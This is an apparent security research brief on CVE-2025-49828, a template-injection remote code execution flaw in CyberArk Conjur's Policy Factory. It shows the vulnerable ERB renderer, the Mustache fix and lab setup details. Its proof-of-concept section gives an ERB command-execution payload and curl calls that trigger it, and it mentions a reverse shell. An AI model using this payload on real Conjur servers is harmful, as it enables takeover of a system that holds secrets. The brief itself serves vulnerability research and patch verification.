# Intel Brief: CVE-2025-49828

## CVE Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-49828 |
| **Title** | Remote Code Execution via Server-Side Template Injection in CyberArk Conjur |
| **Affected Software** | CyberArk Conjur OSS / Secrets Manager, Self-Hosted (formerly Conjur Enterprise) |
| **Vendor** | CyberArk |
| **CVSS Score** | 8.8 (HIGH) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **EPSS** | 0.7% (71.5th percentile) |
| **CWE** | CWE-1336 — Improper Neutralization of Special Elements Used in a Template Engine |
| **Published** | 2025-07-15 |
| **Discoverers** | Yarden Porat and Shahar Tal (Cyata Security) |

## Affected Versions

| Product | Vulnerable Range | Fixed Version |
|---|---|---|
| Conjur OSS | 1.20.1 through 1.21.1 | 1.21.2 |
| Secrets Manager, Self-Hosted (Enterprise) | 13.1 through 13.4.1 | 13.5 |

## Repository & Version Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/cyberark/conjur.git |
| **Vulnerable Version Tag** | `v1.21.1` (commit `a579909060c028c84ab60dc0a984e8e386c65c30`) |
| **Fix Commit** | `b3c19593f741509877347ae5e1cbfaa04ef0f259` ("Replaces the original templating engine with Mustache") |
| **Fix Merge Commit** | `ed7fe239` (Merge PR #512 from Conjur-Enterprise/CNJR-6700-replace-erb-with-mustache) |
| **Patched Version Tag** | `v1.21.2` (commit `4a4fd0ef5777f206dc773e504e6d17e8fa28f00a`) |
| **Checked Out** | `v1.21.1` (vulnerable) |

## Vulnerability Description

CyberArk Conjur's **Policy Factory** feature uses a template rendering engine to generate Conjur policies from user-supplied parameters. In vulnerable versions, the `Factories::Renderer` class uses Ruby's **ERB (Embedded Ruby)** as its template engine. ERB is a full-featured templating system that permits arbitrary Ruby code execution within `<%= %>` tags.

An authenticated attacker who can inject or modify factory templates stored in the Conjur database (stored as Base64-encoded JSON in Conjur variables) can inject malicious ERB template directives that execute arbitrary Ruby code within the Conjur server process when any user creates a resource using the compromised factory template.

### Root Cause

The vulnerable code is in `app/domain/factories/renderer.rb`:

```ruby
# VULNERABLE VERSION (v1.21.1)
module Factories
  class Renderer
    def initialize(render_engine: ERB)
      @render_engine = render_engine
      @success = ::SuccessResponse
      @failure = ::FailureResponse
    end

    def render(template:, variables:)
      @success.new(@render_engine.new(template, trim_mode: '-').result_with_hash(variables))
    rescue NameError => e
      @failure.new("Required template variable '#{e.name}' is missing")
    rescue => e
      @failure.new(e)
    end
  end
end
```

The critical line is:
```ruby
@render_engine.new(template, trim_mode: '-').result_with_hash(variables)
```

`ERB.new(template).result_with_hash(variables)` evaluates the template string as Ruby code, meaning any ERB tags (`<%= system('malicious_command') %>`) in the template will be executed server-side.

### Attack Surface

1. **Factory templates** are stored as Base64-encoded JSON in Conjur variables at path `conjur/factories/{classification}/{version}/{name}`
2. The factory template contains:
   - `policy` — Base64-encoded ERB template for Conjur policy generation
   - `policy_branch` — Plain text ERB template for policy branch path
   - `schema` — JSON Schema for request validation
3. Both `policy` and `policy_branch` are rendered through the ERB engine
4. The rendering is triggered via the API endpoint:
   - `POST /factory-resources/:account/:kind/(:version)/:id` — Creates a resource from a factory
   - `PATCH /factory-resources/:account/:kind/(:version)/:id` — Updates a resource via factory

### Attack Flow

1. Attacker authenticates to Conjur (requires `PR:L` — Low privileges, but must have execute permissions on factory variables)
2. Attacker modifies a factory template variable in the database to inject ERB code (e.g., `<%= system('id') %>` or `<%= `whoami` %>`)
3. When the factory-resources API endpoint is called (by the attacker or any other user), the `Renderer` evaluates the malicious ERB template
4. Arbitrary Ruby code executes in the Conjur server process context

### Input Filtering Bypass

The `Factories::Utilities.filter_input` method only sanitizes **request body variables** (the values provided when creating a resource), NOT the template itself. The template comes directly from the database without any sanitization:

```ruby
# Utilities.filter_input only strips special chars from variable VALUES
def self.filter_input(str)
  regex = Regexp.new('[^0-9a-z,\-_\/]', Regexp::IGNORECASE)
  str.gsub(regex, '')
end
```

## The Fix

Commit `b3c19593` replaces ERB with **Mustache** — a logic-less template engine that cannot execute arbitrary code. Mustache templates use `{{ }}` syntax and only support variable interpolation and basic iteration, not code execution.

```ruby
# PATCHED VERSION (v1.21.2)
module Factories
  class Renderer
    def initialize(render_engine: Mustache.new)
      @render_engine = render_engine
    end

    def render(template:, variables:)
      response = @render_engine.render(template, transform_variables(variables))
      return @success.new(response) unless response.match(/\}\}/)
      @failure.new('Template includes invalid syntax')
    rescue Mustache::Parser::SyntaxError
      @failure.new('Template includes invalid syntax')
    end
  end
end
```

Key changes:
- ERB → Mustache template engine
- Added `transform_variables` method to convert variables to Mustache-compatible format
- Added syntax validation (checks for unclosed `}}` tags)
- Added `mustache` gem to Gemfile

## Build System & Dependencies

| Field | Value |
|---|---|
| **Language** | Ruby 3.0 |
| **Framework** | Ruby on Rails 6.1.7.8 |
| **Build System** | Bundler (Gemfile/Gemfile.lock) |
| **Bundler Version** | 2.4.14 |
| **Web Server** | Puma 6.4.2 |
| **Database** | PostgreSQL (via `pg` gem 1.5.3, `sequel` ORM) |
| **Container** | Docker (Dockerfile present) |
| **Base Image** | `cyberark/ubuntu-ruby-builder:latest` (builder), `cyberark/ubuntu-ruby-fips:latest` (runtime) |

### Key Dependencies
- `rails` ~> 6.1 (web framework)
- `pg` (PostgreSQL adapter)
- `sequel` / `sequel-rails` (ORM)
- `puma` ~> 6 (application server)
- `json_schemer` (JSON Schema validation for factory requests)
- `slosilo` ~> 3.0 (CyberArk crypto library)
- `conjur-policy-parser` (local gem in `gems/policy-parser/`)
- `conjur-rack` (local gem in `gems/conjur-rack/`)

### Runtime Services Required
- PostgreSQL 15 (primary database)
- PostgreSQL 15 (audit database, optional)

### Docker Build
```bash
# Build the production image
docker build -t conjur:v1.21.1 .

# The dev environment uses dev/docker-compose.yml with:
# - pg (PostgreSQL 15)
# - conjur (the application, port 3000)
# - Various auth backends (LDAP, Keycloak, etc.)
```

### Environment Variables for Lab
```
DATABASE_URL=postgres://postgres@pg/postgres
CONJUR_ADMIN_PASSWORD=ADmin123!!!!
CONJUR_ACCOUNT=cucumber
CONJUR_DATA_KEY=<generated-data-encryption-key>
RAILS_ENV=development
CONJUR_LOG_LEVEL=debug
```

## Key Files for PoC Development

| File | Purpose |
|---|---|
| `app/domain/factories/renderer.rb` | **VULNERABLE** — ERB template rendering |
| `app/domain/factories/create_from_policy_factory.rb` | Orchestrates factory resource creation, calls renderer |
| `app/domain/factories/base.rb` | Factory base class with renderer, utilities, policy loader |
| `app/domain/factories/utilities.rb` | Input filtering (only filters variable values, not templates) |
| `app/controllers/policy_factory_resources_controller.rb` | API controller — `create` action triggers rendering |
| `app/db/repository/policy_factory_repository.rb` | Loads factory templates from database |
| `config/routes.rb` | Route: `POST /factory-resources/:account/:kind/(:version)/:id` |
| `Dockerfile` | Production container build |
| `dev/docker-compose.yml` | Dev environment with all services |
| `dev/Dockerfile.dev` | Development container build |

## Public Exploits

**No public exploits found.** EIP reports zero exploits (no Metasploit modules, ExploitDB entries, or GitHub PoCs).

## PoC Strategy

To demonstrate this vulnerability, the PoC should:

1. **Set up Conjur** with PostgreSQL using the dev docker-compose configuration
2. **Initialize the account** and obtain an admin API key via `conjurctl account create`
3. **Load the factory base policy** to enable the Policy Factory feature
4. **Create a malicious factory template** with an ERB payload (e.g., `<%= system('id > /tmp/pwned') %>`) encoded as a factory variable
5. **Trigger rendering** via `POST /factory-resources/:account/:kind/(:version)/:id` with valid request body
6. **Verify RCE** by checking the command output (file creation, reverse shell, etc.)

### Example Malicious Factory Template

```ruby
# Malicious policy template with ERB RCE payload
malicious_policy = Base64.encode64("<%= system('id > /tmp/pwned') %>\n- !policy\n  id: <%= id %>")

factory = {
  "version" => "v1",
  "policy" => Base64.encode64(malicious_policy),  # Double base64 as per storage format
  "policy_branch" => "<%= branch %>",
  "schema" => {
    "$schema" => "http://json-schema.org/draft-06/schema#",
    "title" => "Evil Factory",
    "type" => "object",
    "properties" => {
      "id" => { "type" => "string" },
      "branch" => { "type" => "string" }
    },
    "required" => ["branch", "id"]
  }
}

# Base64-encode the whole factory JSON and store as Conjur variable
encoded_factory = Base64.encode64(factory.to_json)
```

### API Call to Trigger

```bash
# Authenticate
TOKEN=$(curl -s -X POST "http://conjur:3000/authn/cucumber/admin/authenticate" \
  -d "$API_KEY" | base64)

# Create resource from malicious factory (triggers ERB rendering)
curl -X POST "http://conjur:3000/factory-resources/cucumber/evil/v1/pwn" \
  -H "Authorization: Token token=\"$TOKEN\"" \
  -H "Content-Type: application/json" \
  -d '{"id": "test", "branch": "root"}'
```

## References

| Source | URL |
|---|---|
| GitHub Advisory (GHSA) | https://github.com/cyberark/conjur/security/advisories/GHSA-93hx-v9pv-qrm4 |
| Release Notes v1.21.2 | https://github.com/cyberark/conjur/releases/tag/v1.21.2 |
| Fix PR #512 | https://github.com/cyberark/conjur/pull/512 (Conjur-Enterprise/CNJR-6700-replace-erb-with-mustache) |
| OSS-Security (announcement) | http://www.openwall.com/lists/oss-security/2025/07/16/7 |
| OSS-Security (followup) | http://www.openwall.com/lists/oss-security/2025/08/08/1 |
| CyberArk Security Bulletin | CA25-22 (referenced in oss-security post) |
